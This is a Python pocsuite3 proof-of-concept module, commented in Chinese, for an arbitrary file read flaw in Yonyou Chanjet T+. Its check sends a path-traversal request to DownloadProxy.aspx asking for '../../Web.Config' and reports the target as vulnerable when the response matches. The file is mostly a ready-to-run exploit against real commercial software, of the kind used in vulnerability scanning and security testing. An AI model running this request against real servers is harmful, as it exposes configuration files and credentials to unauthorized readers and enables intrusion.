from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD

# 以上就是各种导入模块而已 , 有的用了 , 有的灰色的就是没有使用模块中的内容

class DemoPOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "kailing0220"  # PoC作者的大名
    vulDate = "2014-10-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2014-10-17"  # 编写 PoC 的日期
    updateDate = "2014-10-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = "T+ PoC"  # PoC 名称
    appPowerLink = "http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"  # 漏洞厂商主页地址
    appName = "用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞"  # 漏洞应用名称
    appVersion = "用友 畅捷通T+"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述
    # 各种变量的定义 , 关于poc的描述

    def _check(self):
        # 漏洞验证代码
        headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"  # self.url 就是你指定的-u 参数的值
            res = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, timeout=9)
            # 判断是否存在漏洞
            if res.status_code == 200 and 'value' in res.text:
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(DemoPOC)